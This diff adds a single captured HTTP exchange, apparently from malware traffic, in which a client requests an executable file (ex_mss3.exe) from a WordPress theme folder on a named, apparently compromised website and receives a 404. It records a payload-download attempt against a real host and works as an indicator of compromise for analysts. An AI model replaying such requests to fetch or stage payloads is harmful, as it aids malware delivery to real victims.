@@ -1,0 +1,25 @@
+Get /wp-content/themes/parabola/ex_mss3.exe HTTP/1.1
+Accept: */*
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)
+Host: motosandbikes.es
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 404 Not Found
+Date: Wed, 20 May 2015 08:56:59 GMT
+Server: Apache
+X-Powered-By: PHP/5.2.17
+X-Pingback: http://motosandbikes.es/xmlrpc.php
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+Keep-Alive: timeout=2, max=120
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+3
+404
+0
+
